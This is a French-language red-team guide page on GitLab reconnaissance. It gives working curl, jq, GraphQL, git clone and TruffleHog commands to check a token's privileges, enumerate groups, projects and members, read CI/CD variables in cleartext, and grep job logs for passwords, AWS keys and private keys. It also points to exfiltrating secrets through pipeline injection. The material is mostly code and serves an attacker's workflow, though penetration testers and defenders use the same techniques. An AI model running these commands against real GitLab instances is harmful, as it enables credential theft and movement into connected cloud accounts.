---
title: "Reconnaissance"
order: 1
description: "Énumérer les groupes, projets, membres et snippets GitLab via les API REST v4 et GraphQL, lire les variables CI/CD accessibles, et récolter des secrets depuis le contenu des dépôts, l'historique des commits et les logs de jobs avec un jeton ou un accès anonyme."
keywords:
  - reconnaissance GitLab
  - api/v4
  - variables CI/CD
  - collecte de secrets
  - trufflehog
  - GraphQL
---

# Reconnaissance

Tout ce que vous ferez ensuite dépend de la connaissance du graphe des groupes et projets, de qui détient l'accès, et de l'endroit où des secrets sont déjà à portée. Sur gitlab.com, l'inventaire provient de l'API REST à `https://gitlab.com/api/v4` et du endpoint GraphQL à `https://gitlab.com/api/graphql`. Un en-tête `PRIVATE-TOKEN:` limite les résultats à ce que ce jeton peut lire ; sans en-tête, vous voyez toujours les groupes, projets et snippets publics, ce qui suffit souvent à trouver une fuite qui élargit l'accès.

## Faire l'empreinte et l'identité du jeton d'abord

```bash
# Who am I and what can this token do
curl -s https://gitlab.com/api/v4/user -H "PRIVATE-TOKEN: $TOKEN"
# -> username, id, is_admin (self-managed), and the account this token acts as
curl -s https://gitlab.com/api/v4/personal_access_tokens/self -H "PRIVATE-TOKEN: $TOKEN"
# -> scopes: ["api"], expires_at, revoked; "api" is full read/write
```

Un `is_admin: true` sur une instance auto-hébergée change toute la mission. Un tableau `scopes` contenant `api` signifie que le jeton peut lire et écrire chaque projet qu'il atteint ; `read_api` ou `read_repository` est plus restreint.

## Énumérer les groupes, projets et membres

```bash
# All groups the token sees, then every project under each (pagination matters)
curl -s "https://gitlab.com/api/v4/groups?per_page=100&all_available=true" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq -r '.[].full_path'
curl -s "https://gitlab.com/api/v4/groups/<group_id>/projects?include_subgroups=true&per_page=100" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq -r '.[].path_with_namespace'

# Members, including inherited group membership, reveal targets and privilege
curl -s "https://gitlab.com/api/v4/projects/<id>/members/all?per_page=100" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq -r '.[] | "\(.username) access_level=\(.access_level)"'
```

`access_level=50` est Owner, `40` Maintainer, `30` Developer. Un Developer ou plus sur un projet signifie que vous pouvez y pousser une branche et exécuter un pipeline (voir [injection de pipeline CI/CD](ci-cd-pipeline-injection.md)). La liste de membres `all` intègre les rôles hérités du groupe que le endpoint limité au projet omet.

## Lire directement les variables CI/CD

Un jeton de niveau Maintainer ou plus lit les variables CI/CD stockées d'un projet directement depuis l'API, sans pipeline nécessaire :

```bash
curl -s "https://gitlab.com/api/v4/projects/<id>/variables" -H "PRIVATE-TOKEN: $TOKEN"
# [{"key":"DEPLOY_KEY","value":"...","protected":false,"masked":true}, ...]
curl -s "https://gitlab.com/api/v4/groups/<group_id>/variables" -H "PRIVATE-TOKEN: $TOKEN"
```

Le champ `value` est renvoyé en clair ici quel que soit l'indicateur `masked` ; le masquage ne cache les valeurs que dans les logs de jobs, pas dans cette réponse d'API. Les variables de niveau groupe sont héritées par chaque projet du groupe, de sorte qu'une seule lecture de groupe peut livrer des clés de déploiement et des identifiants cloud utilisés à l'échelle du parc. Un `403` signifie que le jeton est en dessous de Maintainer ; repliez-vous sur l'exfiltration des variables via un pipeline.

## Snippets et balayages GraphQL

```bash
# Public and accessible snippets often hold pasted tokens and config
curl -s "https://gitlab.com/api/v4/snippets/public?per_page=100" | jq -r '.[].web_url'

# GraphQL pulls many fields in one request; good for wide project sweeps
curl -s https://gitlab.com/api/graphql -H "PRIVATE-TOKEN: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ projects(membership:true){ nodes { fullPath, repository { rootRef } } } }"}'
```

## Récolter des secrets depuis les dépôts, l'historique et les logs

Le clonage vous donne tout l'historique, où les secrets supprimés de `HEAD` survivent généralement dans des commits plus anciens :

```bash
# Clone with the token embedded, then scan all branches and history
git clone https://oauth2:$TOKEN@gitlab.com/<namespace>/<project>.git
trufflehog git file://./<project> --only-verified
# or scan a repo over the API without cloning
trufflehog gitlab --token=$TOKEN --repo=https://gitlab.com/<namespace>/<project>.git
```

`--only-verified` filtre vers les secrets que TruffleHog a confirmés actifs contre leur fournisseur, ce qui réduit le bruit et vous indique que l'identifiant fonctionne toujours. Les logs de jobs sont un second trésor : un secret affiché par un build (non masqué, ou masqué puis réassemblé) reste dans le log de l'artefact.

```bash
# Walk recent jobs and pull their trace logs
curl -s "https://gitlab.com/api/v4/projects/<id>/jobs?per_page=100" -H "PRIVATE-TOKEN: $TOKEN" \
  | jq -r '.[].id' | while read j; do
    curl -s "https://gitlab.com/api/v4/projects/<id>/jobs/$j/trace" -H "PRIVATE-TOKEN: $TOKEN"
  done | grep -iE 'token|secret|password|aws_|BEGIN .*PRIVATE KEY'
```

## Suite

Un jeton Maintainer plus des variables lisibles alimentent directement l'[abus de jetons](token-abuse.md). Un jeton Developer sans lecture de variables achemine vers l'[injection de pipeline CI/CD](ci-cd-pipeline-injection.md) pour les exfiltrer via un job. Les identifiants cloud ou de registre vérifiés par TruffleHog pivotent directement hors de GitLab vers le fournisseur connecté.

## Outils

- **TruffleHog** (`trufflehog gitlab`, `trufflehog git`) pour l'analyse de secrets vérifiée.
- **Gitleaks** pour l'analyse de l'historique lors d'un clonage local.
- **glab** (la CLI officielle) pour l'énumération d'API scriptée avec un jeton stocké.

## Références

- [GitLab REST API : projects](https://docs.gitlab.com/ee/api/projects.html)
- [GitLab API : project-level variables](https://docs.gitlab.com/ee/api/project_level_variables.html)
- [TruffleHog GitLab source](https://github.com/trufflesecurity/trufflehog)
- [GitLab GraphQL API reference](https://docs.gitlab.com/ee/api/graphql/reference/)
